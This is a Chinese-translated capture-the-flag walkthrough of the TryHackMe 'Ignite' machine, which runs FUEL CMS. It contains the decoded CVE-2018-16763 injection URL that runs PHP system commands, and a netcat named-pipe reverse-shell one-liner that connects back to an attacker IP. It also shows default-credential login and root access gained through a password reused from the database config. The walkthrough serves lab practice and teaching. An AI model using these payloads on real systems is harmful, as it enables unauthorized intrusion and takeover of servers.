<html>
<head>
<title>[THM] Ignite Writeup</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">[THM]点燃记录</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/thm-ignite-writeup-9a5ac8ac098?source=collection_archive---------1-----------------------#2022-02-23">https://infosecwriteups.com/thm-ignite-writeup-9a5ac8ac098?source=collection_archive---------1-----------------------#2022-02-23</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/7e17ccc47996c58cc1637bcb99893df5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jcEZLC5A839X6tk7WO645A.png"/></div></div></figure><p id="6fbd" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><a class="ae kw" href="https://tryhackme.com/room/ignite" rel="noopener ugc nofollow" target="_blank"> Ignite </a>是TryHackMe中的一个简单机器，我们将在其中使用基本枚举，了解更多关于<a class="ae kw" href="https://www.getfuelcms.com/" rel="noopener ugc nofollow" target="_blank"> FUEL CMS </a>的信息，以及如何探索它以获得对服务器的访问。</p></div><div class="ab cl kx ky hu kz" role="separator"><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc"/></div><div class="ij ik il im in"><p id="8071" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">首先，让我们用<a class="ae kw" href="https://github.com/robertdavidgraham/masscan" rel="noopener ugc nofollow" target="_blank"> MASSCAN </a>看看哪些端口是打开的:</p><pre class="le lf lg lh gt li lj lk ll aw lm bi"><span id="a574" class="ln lo iq lj b gy lp lq l lr ls">masscan -p- --rate 10000 10.10.217.174</span></pre><ul class=""><li id="b683" class="lt lu iq ka b kb kc kf kg kj lv kn lw kr lx kv ly lz ma mb bi translated"><code class="fe mc md me lj b">p-</code>:枚举所有TCP端口，从1到65535</li><li id="3e57" class="lt lu iq ka b kb mf kf mg kj mh kn mi kr mj kv ly lz ma mb bi translated"><code class="fe mc md me lj b">-rate</code>:每秒向主机发送多少数据包</li></ul><blockquote class="mk ml mm"><p id="691c" class="jy jz mn ka b kb kc kd ke kf kg kh ki mo kk kl km mp ko kp kq mq ks kt ku kv ij bi translated">我更喜欢使用MASSCAN来枚举端口，因为它比nmap快得多，所以在发现端口后，我们可以使用nmap来单独检查这些端口中运行的服务。</p></blockquote><figure class="le lf lg lh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mr"><img src="../Images/d7a5595b7cad71d8d94932e1dace61ab.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0a3cZ2bXutH5MHYWfpevDg.png"/></div></div><figcaption class="ms mt gj gh gi mu mv bd b be z dk translated">质量扫描输出</figcaption></figure><p id="6d26" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">从输出中，我们看到只有<strong class="ka ir">端口80 </strong>是打开的，所以现在我不会运行nmap，相反，让我们通过在浏览器中访问web服务器来检查我们能找到什么:</p><figure class="le lf lg lh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mw"><img src="../Images/bd346cf359ce7c4f8cb8d0464ed44ec0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*UrBVeEPEEtKPNaAsi77XmQ.png"/></div></div><figcaption class="ms mt gj gh gi mu mv bd b be z dk translated">http://10.10.217.174/</figcaption></figure><p id="3f00" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">这里我们找到了<a class="ae kw" href="https://www.getfuelcms.com/" rel="noopener ugc nofollow" target="_blank"> FUEL CMS </a>的默认登陆页面，它基本上是一个用于创建web应用程序的<a class="ae kw" href="https://www.codeigniter.com/" rel="noopener ugc nofollow" target="_blank"> CodeIgniter </a>(一个PHP web框架)开发平台。</p><p id="ebdc" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">看一看这第一页，有些东西引起了我的注意:</p><figure class="le lf lg lh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mx"><img src="../Images/6e7600dc99aea83b88ea3a910e467e2f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*apIs5IZ_JCZ2aVPjnhvVsg.png"/></div></div><figcaption class="ms mt gj gh gi mu mv bd b be z dk translated">http://10.10.217.174/</figcaption></figure><p id="f0ed" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><code class="fe mc md me lj b">/fuel</code>目录指向一个登录表单，可以使用默认凭证<code class="fe mc md me lj b">admin:admin</code>访问这个表单(不奇怪)<strong class="ka ir">。</strong></p><figure class="le lf lg lh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi my"><img src="../Images/85520ea8bf084a7ff9419c4b5cc55032.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*AiLY2JxoyOxa90tke-YmaQ.png"/></div></div><figcaption class="ms mt gj gh gi mu mv bd b be z dk translated">http://10 . 10 . 217 . 174/燃料</figcaption></figure><p id="01be" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">然而，即使有了这个权限，我也不能在管理界面上做太多事情。我尝试了一些<a class="ae kw" href="https://book.hacktricks.xyz/pentesting-web/file-upload" rel="noopener ugc nofollow" target="_blank">文件上传技术</a>，但似乎能够访问这个页面是一个兔子洞，所以让我们暂时不要管它。</p><h2 id="e054" class="ln lo iq bd mz na nb dn nc nd ne dp nf kj ng nh ni kn nj nk nl kr nm nn no np bi translated">接近机器</h2><p id="50b7" class="pw-post-body-paragraph jy jz iq ka b kb nq kd ke kf nr kh ki kj ns kl km kn nt kp kq kr nu kt ku kv ij bi translated">让我们尝试使用<a class="ae kw" href="https://www.exploit-db.com/searchsploit" rel="noopener ugc nofollow" target="_blank"> searchsploit </a>来查找FUEL CMS是否有任何已知的漏洞:</p><pre class="le lf lg lh gt li lj lk ll aw lm bi"><span id="a78e" class="ln lo iq lj b gy lp lq l lr ls">searchsploit fuel</span></pre><figure class="le lf lg lh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nv"><img src="../Images/485486a7e6d8424033c70a5508491775.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*LcE1y49ZbY9cqRwW-dnQhA.png"/></div></div><figcaption class="ms mt gj gh gi mu mv bd b be z dk translated"><code class="fe mc md me lj b">searchsploit output</code></figcaption></figure><p id="dabc" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">在这种情况下，导致远程代码执行的漏洞是我们最好的朋友，幸运的是，我们有一个这样的工具。我们可以通过运行以下命令来下载脚本:</p><pre class="le lf lg lh gt li lj lk ll aw lm bi"><span id="ae9d" class="ln lo iq lj b gy lp lq l lr ls">searchsploit -m php/webapps/50477.py</span></pre><figure class="le lf lg lh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nw"><img src="../Images/2b30ddffa5f9e84ea0f8170ea89e197a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JCfahxzZAOxFLZpzSrbPgA.png"/></div></div><figcaption class="ms mt gj gh gi mu mv bd b be z dk translated">searchsploit镜像命令</figcaption></figure><ul class=""><li id="760b" class="lt lu iq ka b kb kc kf kg kj lv kn lw kr lx kv ly lz ma mb bi translated"><code class="fe mc md me lj b">-m</code>:将漏洞镜像到当前工作目录</li></ul><blockquote class="mk ml mm"><p id="e2e5" class="jy jz mn ka b kb kc kd ke kf kg kh ki mo kk kl km mp ko kp kq mq ks kt ku kv ij bi translated">提示:在决定镜像哪个漏洞之前，您可以使用<code class="fe mc md me lj b">-x</code>选项来检查漏洞。</p></blockquote><p id="c448" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我选择这个特殊的脚本是因为它是用我熟悉的Python 3编写的，这使得我在需要时可以更容易地修改一些东西，但是您可以使用任何其他可能适合您的脚本。</p><p id="68bd" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">该脚本探究了<a class="ae kw" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2018-16763" rel="noopener ugc nofollow" target="_blank"> CVE-2018-16763 </a>中披露的漏洞，该漏洞表明≤ 1.4.1版本的FUEL CMS容易受到远程代码执行(RCE)的攻击，这是由于在<code class="fe mc md me lj b">/pages/select</code>过滤器参数和<code class="fe mc md me lj b">/preview</code>数据参数中不正确的输入验证造成的。</p><p id="04f9" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">仔细看看这个脚本，我们可以看到它是如何与服务器通信的:</p><figure class="le lf lg lh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nx"><img src="../Images/f24ce8dd70898fa94bf484f108204e04.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZypXv6yBgR73slyyEQhUFA.png"/></div></div><figcaption class="ms mt gj gh gi mu mv bd b be z dk translated">漏洞脚本</figcaption></figure><p id="4e9f" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">为了解码URL，我使用了<a class="ae kw" href="https://gchq.github.io/CyberChef/#recipe=URL_Decode()" rel="noopener ugc nofollow" target="_blank"> CyberChef </a>中的<code class="fe mc md me lj b">URL Decode</code>配方，产生了以下代码:</p><pre class="le lf lg lh gt li lj lk ll aw lm bi"><span id="412b" class="ln lo iq lj b gy lp lq l lr ls">main_url = url+"/fuel/pages/select/?filter='+pi(print($a='system'))+$a('"+quote(cmd)+"')+'"</span></pre><p id="16c0" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">所以基本上，这个漏洞所做的就是在服务器中执行一个<a class="ae kw" href="https://www.php.net/manual/en/function.system.php" rel="noopener ugc nofollow" target="_blank"> PHP系统</a>命令:</p><figure class="le lf lg lh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ny"><img src="../Images/d6451163138db93503c31537b1617116.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*E-wzM89fsJEziw8PbQh1Pg.png"/></div></div></figure><p id="4196" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">因为我们可以执行系统命令，所以我们可以在服务器中生成一个反向shell，所以在另一个终端中，让我们开始监听连接:</p><pre class="le lf lg lh gt li lj lk ll aw lm bi"><span id="4eb0" class="ln lo iq lj b gy lp lq l lr ls">nc -lvnp 1123</span></pre><p id="896f" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">在运行漏洞利用的终端中，我们可以发送以下命令来生成一个反向shell:</p><pre class="le lf lg lh gt li lj lk ll aw lm bi"><span id="9a41" class="ln lo iq lj b gy lp lq l lr ls">rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.14.21.44 1123 &gt;/tmp/f</span></pre><figure class="le lf lg lh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nz"><img src="../Images/b9c48c837357fcd513d26ae5f03f05cd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*nPeNXUjNIvbSl4pCiyU4Wg.png"/></div></div></figure><p id="4f37" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">之后，我们可以在终端中检查连接是否可以建立:</p><figure class="le lf lg lh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi oa"><img src="../Images/424ed83cef52e6cb538fca63a7b2f78e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ua6CGI9NENthOTzws-W2zA.png"/></div></div><figcaption class="ms mt gj gh gi mu mv bd b be z dk translated">机器访问✅</figcaption></figure><p id="7f11" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">首先，我们来换一个更好的外壳:</p><pre class="le lf lg lh gt li lj lk ll aw lm bi"><span id="bbb2" class="ln lo iq lj b gy lp lq l lr ls">python -c 'import pty; pty.spawn("/bin/bash")'</span></pre><p id="6d29" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">现在，我们可以在目录和文件中查找用户标志:</p><pre class="le lf lg lh gt li lj lk ll aw lm bi"><span id="953b" class="ln lo iq lj b gy lp lq l lr ls">cat /home/www-data/flag.txt</span></pre><h2 id="6b97" class="ln lo iq bd mz na nb dn nc nd ne dp nf kj ng nh ni kn nj nk nl kr nm nn no np bi translated">权限提升</h2><p id="f9cc" class="pw-post-body-paragraph jy jz iq ka b kb nq kd ke kf nr kh ki kj ns kl km kn nt kp kq kr nu kt ku kv ij bi translated">在尝试了一些<a class="ae kw" href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" rel="noopener ugc nofollow" target="_blank">基本权限提升</a>技术后，我决定再次查看我们找到的第一个页面(默认登录页面)，然后我看到了一些有趣的东西:</p><figure class="le lf lg lh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ob"><img src="../Images/775646d758c6c381d098a03179b93aec.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jTYAomzxhkpONStEHPQKpg.png"/></div></div><figcaption class="ms mt gj gh gi mu mv bd b be z dk translated">http://10.10.217.174/</figcaption></figure><p id="d4fe" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">那么，让我们来看看数据库文件:</p><pre class="le lf lg lh gt li lj lk ll aw lm bi"><span id="3841" class="ln lo iq lj b gy lp lq l lr ls">cat /var/www/html/fuel/application/config/database.php</span></pre><p id="7eb4" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">在文件的末尾，我们可以找到一些凭证:</p><figure class="le lf lg lh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi oc"><img src="../Images/a83d0244b28f72fc0afcc4aad511184d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WXflR-3Kygru7wCZul4ejA.png"/></div></div><figcaption class="ms mt gj gh gi mu mv bd b be z dk translated"><code class="fe mc md me lj b">/var/www/html/fuel/application/config/database.php</code></figcaption></figure><p id="2559" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们可以尝试看看这个密码对于root用户是否相同:</p><figure class="le lf lg lh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi od"><img src="../Images/dfcf9179623d8a9152f7d3bd9a0b1bf2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*3cMzOMANc1VTOaBTDyF6CQ.png"/></div></div><figcaption class="ms mt gj gh gi mu mv bd b be z dk translated">确实是！特权升级✅</figcaption></figure><p id="a961" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">现在我们可以读取根标志:</p><pre class="le lf lg lh gt li lj lk ll aw lm bi"><span id="ef50" class="ln lo iq lj b gy lp lq l lr ls">cat /root/root.txt</span></pre><h2 id="9ee8" class="ln lo iq bd mz na nb dn nc nd ne dp nf kj ng nh ni kn nj nk nl kr nm nn no np bi translated">结论</h2><p id="2254" class="pw-post-body-paragraph jy jz iq ka b kb nq kd ke kf nr kh ki kj ns kl km kn nt kp kq kr nu kt ku kv ij bi translated">这是一个很好的利用机器，尤其是告诉我们答案就在我们面前，我们只需要记住每当我们遇到困难时，要仔细检查我们已经知道的东西。</p></div><div class="ab cl kx ky hu kz" role="separator"><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc"/></div><div class="ij ik il im in"><h1 id="e5e8" class="oe lo iq bd mz of og oh nc oi oj ok nf ol om on ni oo op oq nl or os ot no ou bi translated">🔈 🔈Infosec Writeups正在组织其首次虚拟会议和网络活动。如果你对信息安全感兴趣，这是最酷的地方，有16个令人难以置信的演讲者和10多个小时充满力量的讨论会议。<a class="ae kw" href="https://iwcon.live/" rel="noopener ugc nofollow" target="_blank">查看更多详情并在此注册。</a></h1><div class="ov ow gp gr ox oy"><a href="https://iwcon.live/" rel="noopener  ugc nofollow" target="_blank"><div class="oz ab fo"><div class="pa ab pb cl cj pc"><h2 class="bd ir gy z fp pd fr fs pe fu fw ip bi translated">IWCon2022 - Infosec书面报告虚拟会议</h2><div class="pf l"><h3 class="bd b gy z fp pd fr fs pe fu fw dk translated">与世界上最优秀的信息安全专家建立联系。了解网络安全专家如何取得成功。将新技能添加到您的…</h3></div><div class="pg l"><p class="bd b dl z fp pd fr fs pe fu fw dk translated">iwcon.live</p></div></div><div class="ph l"><div class="pi l pj pk pl ph pm jw oy"/></div></div></a></div></div></div>    
</body>
</html>